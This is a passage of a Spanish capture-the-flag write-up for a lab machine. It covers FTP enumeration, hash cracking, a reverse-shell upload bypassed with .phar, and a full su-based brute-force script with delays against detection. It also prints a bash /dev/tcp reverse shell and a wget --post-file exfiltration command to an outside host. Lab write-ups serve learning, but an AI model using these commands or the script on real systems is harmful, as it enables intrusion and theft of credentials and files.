# File
## Reconocimiento
### Nmap
Como primer paso, realizo vía Nmap un escaneo de puertos, identificando versiones y servicios en estos.
```
❯ nmap -p 0-65535 --open -T5 -A -sT -Pn -n 172.17.0.2 -oX nmapScan.xml && xsltproc nmapScan.xml -o nmapScan.html && open nmapScan.html &>/dev/null & disown
```

![[Ciberseguridad/Hacking/Writeups/253_septiembre/12-file(A)/imgs/nmap.png]]

Como se puede ver, permite el login iniciando sesión como `ftp`, así que voy a entrar a ver si hay algún archivo que pueda resultar interesante, luego pasaré a echarle un ojo a la web.
Dentro de ftp hago un `ls` y veo que hay un archivo llamado anon.txt, lo descargo en mi máquina usando `curl` y veo que es un string de caracteres, probablemente una contraseña cifrada.

![[Ciberseguridad/Hacking/Writeups/253_septiembre/12-file(A)/imgs/ftp.png]]

 
## Explotación
Utilizo la herramienta `hash-identifier` para ver que algoritmo puede haberse usado para cifrar este string.

![[hashid.png]]

Una vez identificado el tipo de hash, con john crackeo el string y obtengo como resultado `justin`, por ahora no se muy bien que hacer con esto ya que la máquina no tiene SSH, así que voy a guardarlo.

![[justin.png]]

Un fuzzeo revela la ruta `/file_upload.php`, así que está claro lo que voy a hacer, subiré una revshell para luego acceder a ella desde `/uploads` y así ganar acceso a la máquina.

![[Ciberseguridad/Hacking/Writeups/253_septiembre/12-file(A)/imgs/ffuf.png]]

En principio, veo que está securizado, y después de probar varias extensiones de archivo para poder subir el archivo al servidor, finalmente lo consigo con `.phar`
## Post
Lo primero es siempre sanitizar la shell

![[Ciberseguridad/Hacking/Writeups/253_septiembre/12-file(A)/imgs/sanitize.png]]

Luego, descargo con `wget` el rockyou.txt, ya que hay varios usuarios a los que quiero probar un ataque diccionario, con `cat /etc/passwd` se ve que hay 4 usuarios, y usando echo con comillas y el operador `>` escribimos en un archivo los nombres para realizar el ataque.
Hago con IA un script que iterará por los 4 usuarios que me interesan con el diccionario previamente descargado y lo sirvo con un servidor HTTP levantado con python a la shell que tengo dentro de la máquina.
```bash
#!/bin/bash
#
# Script de fuerza bruta local para múltiples usuarios
# Uso: ./brute_local.sh [wordlist] [usuarios]
#

# Colores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuración
WORDLIST=${1:-"/tmp/rockyou.txt"}
USER_LIST=${2:-"fernando mario julen iker"}
DELAY=1 # Delay entre intentos (evitar detección)

echo -e "${YELLOW}[+] Iniciando fuerza bruta local${NC}"
echo -e "${YELLOW}[+] Wordlist: $WORDLIST${NC}"
echo -e "${YELLOW}[+] Usuarios: $USER_LIST${NC}"
echo ""

# Verificar si la wordlist existe
if [ ! -f "$WORDLIST" ]; then
  echo -e "${RED}[-] Error: Wordlist no encontrada: $WORDLIST${NC}"
  echo "[-] Creando wordlist básica..."
  echo -e "password\n123456\nadmin\ntest\nroot\n12345\n1234\n123456789\nqwerty" >/tmp/wordlist.txt
  WORDLIST="/tmp/wordlist.txt"
fi

# Contador de contraseñas probadas
TOTAL_PASSWORDS=$(wc -l <"$WORDLIST")
echo -e "${YELLOW}[+] Probando $TOTAL_PASSWORDS contraseñas por usuario${NC}"

# Función para probar contraseña
test_password() {
  local user=$1
  local password=$2

  # Intentar autenticación con 'su'
  echo "$password" | timeout 3 su - "$user" -c "whoami" 2>/dev/null

  if [ $? -eq 0 ]; then
    return 0 # Éxito
  else
    return 1 # Fallo
  fi
}

# Bucle principal por cada usuario
for USER in $USER_LIST; do
  echo -e "\n${YELLOW}[+] Probando usuario: $USER${NC}"
  COUNTER=0
  FOUND=0

  # Verificar si el usuario existe
  if id "$USER" &>/dev/null; then
    while read -r PASSWORD; do
      ((COUNTER++))

      # Mostrar progreso cada 10 intentos
      if [ $((COUNTER % 10)) -eq 0 ]; then
        echo -ne "[$COUNTER/$TOTAL_PASSWORDS] Probando: $PASSWORD\033[0K\r"
      fi

      # Probar la contraseña
      if test_password "$USER" "$PASSWORD"; then
        echo -e "\n${GREEN}[+] ¡CREDENCIALES ENCONTRADAS!${NC}"
        echo -e "${GREEN}[+] Usuario: $USER${NC}"
        echo -e "${GREEN}[+] Contraseña: $PASSWORD${NC}"
        echo ""
        FOUND=1
        break
      fi

      # Delay para evitar detección
      sleep $DELAY

    done <"$WORDLIST"

    if [ $FOUND -eq 0 ]; then
      echo -e "${RED}[-] No se encontró contraseña para $USER${NC}"
    fi

  else
    echo -e "${RED}[-] El usuario $USER no existe${NC}"
  fi
done

echo -e "\n${YELLOW}[+] Escaneo completado${NC}"

```

![[httpserv.png]]

Entonces, lo descargo desde allí con `wget http://IP_EJEMPLO:8000/script.bash`, le doy permisos de ejecución con `chmod +x script.bash` y lo ejecuto. Rápidamente encuentra la clave: chocolate.
Pivoto entonces a fernando con la clave chocolate, la shell esta totalmente vacía así que me mando una revshell al siguiente puerto con  `bash -i >& /dev/tcp/192.168.1.157/444 0>&1` y sanitizo allí de nuevo como fernando.
Al visitar /home/fernando me encuentro con un archivo llamado dragon-medieval.jpeg, lo mando a mi máquina con:
```
wget --post- file=/tmp/dragon-medieval.jpeg http://192.168.1.157:8000/ --timeout=3 -t 1 -q
```
habiendo levantado antes un servidor HTTP con python de nuevo.
Una vez tengo el archivo en mi máquina

